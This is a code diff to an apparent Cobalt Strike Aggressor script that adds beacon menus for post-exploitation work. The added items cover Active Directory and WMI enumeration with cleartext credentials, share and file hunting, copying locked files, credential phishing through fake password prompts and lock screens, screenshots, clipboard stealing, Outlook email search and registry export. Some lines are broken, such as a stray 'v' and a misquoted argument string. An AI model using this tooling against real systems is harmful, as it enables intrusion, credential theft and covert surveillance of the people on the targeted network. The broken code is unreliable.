@@ -58,18 +58,21 @@ item "Find Admin Access - Loud  - T1033"{
 #   Domain Enumeration
 
 #################################################
-menu "Domain Enumeration"
+menu "AD and Domain Enumeration"
 {
+
+
+menu "SharpView (drops identifiable files to disk)" {
 #Domain Name
-item "List Domain"{
+item "List Domain (SharpView)"{
 	local('$bid');
 		foreach $bid ($1){
 			getnetdomain($bid);
 			}
 		}
 
-#Get Domain Security Identifier (SID)
-item "List Domain SID"{
+#Get Domain Security Identifier (SID) (SharpView)
+item "List Domain SID (SharpView)"{
 	local('$bid');
 		foreach $bid ($1){
 			getdomainsid($bid);
@@ -78,20 +81,59 @@ item "List Domain SID"{
 
 
 #Get Domain Security Identifier (SID)
-item "List Domain SID (Specify Domain)"{
+item "List Domain SID (Specify Domain) (SharpView)"{
 	local('$bid');
 		foreach $bid ($1){
 			getdomainsidspec($bid);
 			}
 		}
-}
+		
+		
+#################################################
+
+#   Domain/Forest Enumeration
+
+#################################################
+
+
+#Get Net Forest
+		item "List Domains of Forest  - T1"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetforest($bid);
+					}
+				}
+				
+#Get Net Forest Domain
+		item "Enumerate All Domains for The Current Forest  - T1482"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetforestdomain($bid);
+					}
+				}		
+				
+#Get Net Domain Trust
+		item "Enumerate Domain Trust relationships  - T1482"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetdomaintrust($bid);
+					}
+				}				
+				
+#Get Net Forest Trust
+		item "Enumerate Forest Trusts Of Current Domain  - T1482"{
+			local('$bid');
+				foreach $bid ($1){
+					getnetforesttrust($bid);
+					}
+				}
+
 #################################################
 
 #   Domain User Enumeration
 
 #################################################
-menu "Domain User Enumeration"
-{
+
 #List Admins in Domain
 					
 	item "List Admins in Domain  - T1087"{
@@ -129,14 +171,13 @@ item "Find User Location by Username  - T1033"{
 #	}
 
 }
-}
+
 #################################################
 
 #   Domain Computer Object Enumeration
 
 #################################################
-menu "Domain Computer Object Enumeration"
-{
+
 	
 #List computers in Domain
 					
@@ -154,24 +195,14 @@ menu "Domain Computer Object Enumeration"
 				foreach $bid ($1){
 					getnetcomputerdom($bid);
 				}
-			}
+			}		
 
-#List computers in Domain by specifying Operating System
-					
-		item "List Computers with Specific Operating System  - T1018"{
-			local('$bid');
-				foreach $bid ($1){
-					getnetcomputeros($bid);
-				}
-			}			
-}
 #################################################
 
 #   Domain Group Enumeration
 
 #################################################
-menu "Domain Group Enumeration"
-{
+
 ########List Groups in Domain##################
 		item "List Groups in Domain"{
 			local('$bid');
@@ -192,22 +223,7 @@ menu "Domain Group Enumeration"
 				foreach $bid ($1){
 					getnetgroupdomainadmin($bid);
 				}
-			}
-			
-		item "Schema Admin"{
-			local('$bid');
-				foreach $bid ($1){
-					getnetgroupschemaadmin($bid);
-				}
-			}
-		
-		item "Account Operator"{
-			local('$bid');
-				foreach $bid ($1){
-					getnetgroupaccountoperator($bid);
-				}
-			}
-					
+			}					
 			
 		item "Administrator"{
 			local('$bid');
@@ -215,48 +231,199 @@ menu "Domain Group Enumeration"
 					getnetgroupadministrator($bid);
 				}
 			}
-}
+
+
+        } #End of SharpView Menu
 	
+menu "ADSearch" {
 
-#################################################
 
-#   Domain/Forest Enumeration
+item "List Groups"{
 
-#################################################
-menu "Domain/Forest Enumeration"
-{
+    local('$bid');
+        foreach $bid ($1){
+            adsearchlistgroups($bid);
+      }
+   }  #End Item 
+   
+item "List Users"{
 
-#Get Net Forest
-		item "List Domains of Forest  - T1"{
+    local('$bid');
+        foreach $bid ($1){
+            adsearchlistusers($bid);
+      }
+   }  #End Item 
+   
+   
+item "List SPNs"{
+
+    local('$bid');
+        foreach $bid ($1){
+            adsearchlistspns($bid);
+      }
+   }  #End Item 
+   
+   
+item "List Domain Admins"{
+
+    local('$bid');
+        foreach $bid ($1){
+            adsearchlistdomainadmins($bid);
+      }
+    }  #End Item 
+
+sub adsearchlistgroups{
+bexecute_assembly($1, script_resource('/exe/ADSearch.exe'), "--groups");
+}
+
+sub adsearchlistusers{
+bexecute_assembly($1, script_resource('/exe/ADSearch.exe'), "--users");
+}
+
+sub adsearchlistspns{
+bexecute_assembly($1, script_resource('/exe/ADSearch.exe'), "--spns");
+}
+
+sub adsearchlistdomainadmins{
+bexecute_assembly($1, script_resource('/exe/ADSearch.exe'), "--domain-admins");
+}
+ 
+
+} #End of ADSearch Menu
+    
+    } #End of AD Menu
+
+
+
+################################################
+
+#Remote WMI Enumeration
+
+################################################
+
+menu "Remote Computer Enumeration (WMI)" {
+		
+		
+		item "List Remote Processes on Computer"{
 			local('$bid');
 				foreach $bid ($1){
-					getnetforest($bid);
-					}
+					remoteprocessoncomputer($bid);
 				}
-				
-#Get Net Forest Domain
-		item "Enumerate All Domains for The Current Forest  - T1482"{
+			}
+
+		item "List Remote Services on Computer"{
 			local('$bid');
 				foreach $bid ($1){
-					getnetforestdomain($bid);
-					}
-				}		
-				
-#Get Net Domain Trust
-		item "Enumerate Domain Trust relationships  - T1482"{
-			local('$bid');
-				foreach $bid ($1){
-					getnetdomaintrust($bid);
-					}
-				}				
-				
-#Get Net Forest Trust
-		item "Enumerate Forest Trusts Of Current Domain  - T1482"{
-			local('$bid');
-				foreach $bid ($1){
-					getnetforesttrust($bid);
-					}
+					remoteserviceoncomputer($bid);
 				}
+			}
+
+		item "List Remote Anti-Virus on Computer w/alternate creds"{
+			local('$bid');
+				foreach $bid ($1){
+					remoteantivirusoncomputerwithpassword($bid);
+				}
+			}
+			
+		item "List Remote Anti-Virus on Computer w/current creds"{
+			local('$bid');
+				foreach $bid ($1){
+					remoteantivirusoncomputerwithcurrentpassword($bid);
+				}
+			}			
+			
+		item "List Logon Events for a User"{
+			local('$bid');
+				foreach $bid ($1){
+					querylogoneventsforuser($bid);
+				}
+			}
+			
+		} #End Menu
+
+#Function to Query Remote Processes
+sub remoteprocessoncomputer{
+    $bid = $1;
+    $dialog = dialog("Query Remote Processes", %(computername => "", username => "", password => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "ListRemoteProcess $3['computername'] $3['username'] $3['password']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Querying Remote Processes');
+            bexecute_assembly($bid, script_resource('/exe/WMIUtility.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Query Remote Processes");
+    drow_text($dialog, "computername",  "Please Enter the Computer Name:");
+    drow_text($dialog, "username",  "Please Enter the UserName:");
+    drow_text($dialog, "password",  "Please Enter the a Password:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+
+#Function to Query Remote Services
+sub remoteserviceoncomputer{
+    $bid = $1;
+    $dialog = dialog("Query Remote Services", %(computername => "", username => "", password => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "ListRemoteService $3['computername'] $3['username'] $3['password']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Querying Remote Services');
+            bexecute_assembly($bid, script_resource('/exe/WMIUtility.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Query Remote Services w/alternate creds");
+    drow_text($dialog, "computername",  "Please Enter the computername:");
+    drow_text($dialog, "username",  "Please Enter a username:");
+    drow_text($dialog, "password",  "Please Enter a cleartext password:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+
+#Function to Query Remote Antivirus
+sub remoteantivirusoncomputerwithpassword{
+    $bid = $1;
+    $dialog = dialog("Query Remote AV", %(computername => "", username => "", password => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "Get-AV $3['computername'] $3['username'] $3['password']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Querying Remote Anti-Virus');
+            bexecute_assembly($bid, script_resource('/exe/WMIUtility.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Query Remote AV w/alternate creds");
+    drow_text($dialog, "computername",  "Please Enter the computername:");
+    drow_text($dialog, "username",  "Please Enter a username:");
+    drow_text($dialog, "password",  "Please Enter a cleartext password:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+
+
+#Function to Query Logon Events for a User
+sub querylogoneventsforuser{
+    $bid = $1;
+    $dialog = dialog("Query Logon Events for user", %(samaccountname => "", domaincontroller => "", username => "", password => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "Get-EventForUser $3['samaccountname'] $3['domaincontroller'] $3['username']" $3['password'];
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Querying Logon Events');
+            bexecute_assembly($bid, script_resource('/exe/WMIUtility.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Query Logon Events for User");
+    drow_text($dialog, "samaccountname",  "Please Enter the samaccountname:");
+    drow_text($dialog, "domaincontroller",  "Please Enter the Domain Controller:");
+    drow_text($dialog, "username",  "Please Enter a Username:");
+    drow_text($dialog, "password",  "Please Enter a Password:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+}
+
+#Function to query remote AV
+sub remoteantivirusoncomputerwithcurrentpassword{
+prompt_text("Enter Computer Name", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/WMIUtility.exe"), "Get-AV $1");
+}, $bids => $1));
 }
 
 #################################################
@@ -373,6 +540,26 @@ item "Display All Available Shares Based On Domain Controller & Domain - T1135"{
 } #End Snaffler Menu
 
 
+item "Find Shares using SharpShares"{
+	local('$bid');
+		foreach $bid ($1){
+			sharpshares($bid);
+			}
+		}
+
+item "Find Shares using SharpShares - Not OPSEC"{
+	local('$bid');
+		foreach $bid ($1){
+			sharpsharesmod($bid);
+			}
+		}
+		
+item "Find Files using SharpFiles - Not OPSEC"{
+	local('$bid');
+		foreach $bid ($1){
+			sharpfiles($bid);
+			}
+		}
 
 #Find Cloud Credential Files
 item "Find Cloud Creds"{
@@ -398,6 +585,17 @@ item "Find Interesting Domain Shares  - T1135"{
 		}
 	}
 
+#############################
+#SharpDir - Search For Files
+#############################
+item "SharpDir - Search For Files"{
+
+    local('$bid');
+        foreach $bid ($1){
+            sharpdircustom($bid);
+      }
+   }
+
 #Find File Servers 
 item "Find File Servers  - T1083"{
 	local('$bid');
@@ -405,6 +603,36 @@ item "Find File Servers  - T1083"{
 			getnetfileserver($bid);
 		}
 	}
+	
+menu "LockLess"{
+item "Find All Locked Files And Process Handles - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            locklessall($bid);
+      }
+   }
+
+item "Find Process Handles For Specific File - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            locklessfindproc($bid);
+      }
+   }   
+   
+item "Copy Locked File By Filename - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            locklesscopy($bid);
+      }
+   }   
+
+item "Copy Locked File By Filename and Process ID - T1135"{
+    local('$bid');
+        foreach $bid ($1){
+            locklesscopypid($bid);
+      }
+   }      
+}	
 }
 
 
@@ -459,24 +687,81 @@ menu "Phishing Users"
 {
 #Run CredPhisher
 					
-		item "Prompt for Username and Password  - T1141"{
+	item "Prompt for Username and Password  - T1141"{
+		local('$bid');
+			foreach $bid ($1){
+				credphisher($bid);
+			}
+		}
+		
+#Run Custom CredPhisher	
+	item "Prompt Custom Message  - T1141"{
 			local('$bid');
 				foreach $bid ($1){
-					credphisher($bid);
+					custcredphisher($bid);
 				}
 			}
-		
 			
 #Run Lock Screen Phishing Exploit
 					
-		item "Show Lockscreen to Phish Password  - T1141"{
-			local('$bid');
-				foreach $bid ($1){
-					lockscreen($bid);
-				}
+	item "Show Lockscreen to Phish Password  - T1141"{
+		local('$bid');
+			foreach $bid ($1){
+				lockscreen($bid);
 			}
+		}
 		
 }
+
+#################################################
+
+#   Screenshots
+
+#################################################
+item "Screenshots"{
+	local('$bid');
+		foreach $bid ($1){
+			screenshots($bid);
+		}
+	}
+	
+
+#################################################
+#   Clipboard Stealer By jfmaesa
+#################################################
+
+item "Retrieve Clipboard Contents"{
+	local('$bid');
+		foreach $bid ($1){
+			getclippy($bid);
+		}
+	}
+
+#################################################
+
+#   Email Keyword Search
+
+#################################################
+
+item "Outlook Email Keyword Search"{
+	local('$bid');
+		foreach $bid ($1){
+			getemails($bid);
+		}
+	}
+
+#################################################
+
+#   Registry Strikes Back
+
+#################################################
+
+item "Registry Strikes Back (Export .reg files from registry)"{
+	local('$bid');
+		foreach $bid ($1){
+			regsb($bid);
+		}
+	}
 
 #################################################
 
@@ -651,9 +936,7 @@ bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminA
 sub loudshare{
 bexecute_assembly($1, script_resource('../exe/SharpView.exe'), "Find-LocalAdminAccess -CheckShareAccess");
 }
-sub sharpup{
-bexecute_assembly($1, script_resource('../exe/SharpUp.exe'));
-}
+v
 sub sweetpotato{
 bexecute_assembly($1, script_resource('exe/SweetPotato.exe'));
 }
@@ -728,12 +1011,7 @@ bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-NetComputer
 }, $bids => $1));
 }
 
-# Sharpview Get Net Computer by OS
-sub getnetcomputeros{
-prompt_text("Specifiy an Operating System", "", lambda({
-bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-NetComputer -OperatingSystem $1");
-}, $bids => $1));
-}
+
 #################################################
 
 #   Domain Group Enumeration
@@ -753,16 +1031,6 @@ bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Iden
 # SharpView list Domain Admins
 sub getnetgroupdomainadmin{
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Domain Admins" -Recursive');
-}
-
-# SharpView list Schema Admins
-sub getnetgroupschemaadmin{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Schema Admins" -Recursive');
-}
-
-# SharpView list account operators
-sub getnetgroupaccountoperator{
-bexecute_assembly($1, script_resource('/exe/SharpView.exe'), 'Get-NetGroup -Identity "Account Operators" -Recursive');
 }
 
 # SharpView list Administrators group
@@ -890,6 +1158,20 @@ bexecute_assembly($bids, script_resource("/exe/Snaffler.exe"), "-s -u -j 75 -c $
 #Snaffler.exe -s -u -j 75 -c "$DOMAINCONTROLLER" -d "$DOMAIN" -v data Specify which domain controller (OPSEC) and Domain - try not to hit Azure or ATP DC's - PDC is preferred (Added user switch)
 
 
+#SharpShares
+sub sharpshares{
+bexecute_assembly($1, script_resource('/exe/SharpShares.exe'), "shares");
+}
+
+#SharpShares w/SharpFiles
+sub sharpsharesmod{
+bexecute_assembly($1, script_resource('/exe/sharpshares.exe'));
+}
+
+#SharpFiles
+sub sharpfiles{
+bexecute_assembly($1, script_resource('/exe/sharpfiles.exe'));
+}
 
 # Cloud Creds
 sub cloudcreds{
@@ -911,11 +1193,93 @@ sub findinterestingdomainsharefile{
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Find-InterestingDomainShareFile");
 }
 
+#############################
+#SharpDir - Search For Files
+#############################
+sub sharpdircustom{
+    $bid = $1;
+    $dialog = dialog("Show Domain and DC Shares", %(path => "", file => "", execmethod => "Execute-Assembly"), lambda({
+       $cmdargs = "";
+		$cmdargs = "$3['path'] $3['file']";
+        if ($3["execmethod"] eq "Execute-Assembly"){         
+            bexecute_assembly($bid, script_resource('/exe/SharDir.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Search For Files Using SharpDir");
+    drow_text($dialog, "path",  "Please Enter A Path: ");
+    drow_text($dialog, "file",  "Please Enter A FileName/Wildcard: ");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
 # SharpView Find File Servers
 sub getnetfileserver{
 bexecute_assembly($1, script_resource('/exe/SharpView.exe'), "Get-NetFileServer");
 }
 
+
+#################################################
+#   LockLess - SubMenu
+#################################################
+
+#Find All Locked Files And Process Handles 
+sub locklessall{
+bexecute_assembly($1, script_resource('/exe/LockLess.exe'), "all");
+}
+   
+sub locklessfindproc{
+ $bid = $1;
+    $dialog = dialog("LockLess: Find Which Process Has Handle On File", %(file => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['file']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Finding Process Handle....');
+            bexecute_assembly($bid, script_resource('exe/LockLess.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Find Which Process Has Handle On File");
+    drow_text($dialog, "file",  "Please Enter A FileName:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}
+
+sub locklesscopy{
+ $bid = $1;
+    $dialog = dialog("LockLess: Copy Locked File By FileName", %(file => "", dest => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['file'] /copy:$3['dest']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Copying File....');
+            bexecute_assembly($bid, script_resource('exe/LockLess.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Copy Locked File By FileName");
+    drow_text($dialog, "file",  "Please Enter A FileName:");
+    drow_text($dialog, "dest",  "Please Enter The Destination To Copy The File:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}    
+   
+sub locklesscopypid{
+ $bid = $1;
+    $dialog = dialog("LockLess: Copy Locked File By FileName And Process ID", %(file => "", proc => "", dest => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['file'] /process:$3['proc'] /copy:$3['dest']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Copying File....');
+            bexecute_assembly($bid, script_resource('exe/LockLess.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
+    drow_text($dialog, "file",  "Please Enter A FileName:");
+    drow_text($dialog, "proc",  "Please Enter A Process ID:");
+    drow_text($dialog, "dest",  "Please Enter The Destination To Copy The File:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}
 #################################################
 
 #   Mimikatz: Token Enumeration
@@ -949,7 +1313,25 @@ bmimikatz($1, "token::list /enterpriseadmin");
 
 # Phish Users with small pop up box
 sub credphisher{
-bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), 'Please_Enter_Your_Password');
+bexecute_assembly($1, script_resource('/exe/CredPhisher.exe'), '"Please Enter Your Password"');
+}
+
+# Phish Users with custom pop up box
+sub custcredphisher{
+ $bid = $1;
+    $dialog = dialog("LockLess: Find Which Process Has Handle On File", %(popu => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "\"$3['popu']\"";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Finding Process Handle....');
+            bexecute_assembly($bid, script_resource('exe/CredPhisher.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Custom Cred Phisher Prompt");
+    drow_text($dialog, "popu",  "Please Enter A Custom Pop Up Message:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
 }
 
 # Phish Users with fake lockscreen
@@ -957,6 +1339,74 @@ sub lockscreen{
 bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
 }
 
+#################################################
+
+#   Screenshot
+
+#################################################
+
+sub screenshots{
+ $bid = $1;
+    $dialog = dialog("Screenshots", %(pid => "", arc => "", time => "", execmethod => "Execute-Assembly"), lambda({
+        $cmdargs = "";
+        $cmdargs = "$3['pid'] $3['arc'] $3['time']";
+        if ($3["execmethod"] eq "Execute-Assembly"){
+            btask($bid, 'Taking Screenshots....');
+            bscreenshot($bid, $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Take Screenshots");
+    drow_text($dialog, "pid",  "Please Enter A Process ID:");
+    drow_combobox($dialog, "arc",  "Please Select The Proper Architecture:", @("x64", "x86"));
+    drow_text($dialog, "time",  "How Many Seconds Would You Like To Take Screenshots?:");
+    dbutton_action($dialog, "Execute");
+    dialog_show($dialog);
+
+}
+
+
+#################################################
+#   Clipboard Stealer By jfmaesa
+#################################################
+sub getclippy{
+bexecute_assembly($1, script_resource("/exe/Clippy-B.exe"),"--interval=10 --monitor=4");
+}
+
+#################################################
+
+#   Email Keyword Search
+
+#################################################
+
+sub getemails{
+prompt_text("Enter Keyword:", "", lambda({
+bexecute_assembly($bids, script_resource("/exe/SearchOutlook.exe"), "$1");
+}, $bids => $1));
+}
+
+#################################################
+
+#   Registry Strikes Back
+
+#################################################
+
+sub regsb{
+    $bid = $1;
+    $dialog = dialog("Registry Strikes Back", %(key => "", path => "", execmethod => "Execute-Assembly"), lambda({
+       $cmdargs = "";
+		$cmdargs = "$3['key'] $3['path']";
+        if ($3["execmethod"] eq "Execute-Assembly"){         
+            bexecute_assembly($bid, script_resource('/exe/RegistryStrikesBack.exe'), $cmdargs);
+        }
+    }));
+    dialog_description($dialog, "Export Registry Keys");
+    drow_text($dialog, "key",  "Please Enter A Registry Key: ");
+    drow_text($dialog, "path",  "Please Enter A File Output Path: ");
+    dbutton_action($dialog, "Run");
+	dialog_show($dialog);
+}
+
+		
 #################################################
 
 #   EDR Query
